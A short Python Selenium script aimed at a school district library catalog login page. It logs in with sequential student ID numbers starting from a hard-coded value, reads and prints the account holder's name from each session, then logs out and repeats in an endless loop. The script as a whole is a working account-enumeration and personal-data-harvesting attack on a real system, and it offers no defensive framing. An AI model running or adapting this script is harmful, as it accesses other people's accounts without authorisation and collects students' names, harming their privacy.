#!/usr/bin/python
# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

studentID = 811821
MASTER_URL = "http://webcat.vsb.bc.ca/ipac20/ipac.jsp?session=&profile=ls&auth=false&submenu=subtab13&date="
driver = webdriver.Firefox()
driver.get(MASTER_URL)

def waitForPageToLoad():
	time.sleep(1)

def logout():
	waitForPageToLoad()
	# globalAnchor is the logout button
	logout = driver.find_element_by_class_name("globalAnchor")
	# click it
	logout.send_keys(Keys.RETURN)

	driver.get(MASTER_URL)

def login():
	# make sure we are on correcr page
	assert "VSB webcat" in driver.title
	# find login field
	elem = driver.find_element_by_name("sec1")
	elem.clear()
	elem.send_keys(studentID)
	print(studentID)
	elem.send_keys(Keys.RETURN)

def getLoggedInName():
	waitForPageToLoad()
	name = driver.find_element_by_xpath("//td[@title='Name']")
	loggedInName = name.get_attribute('innerHTML')
	print(loggedInName)


login()
while True:
	try: 
		getLoggedInName()
		logout()

	except: 
		logout()

	studentID += 1
	login()





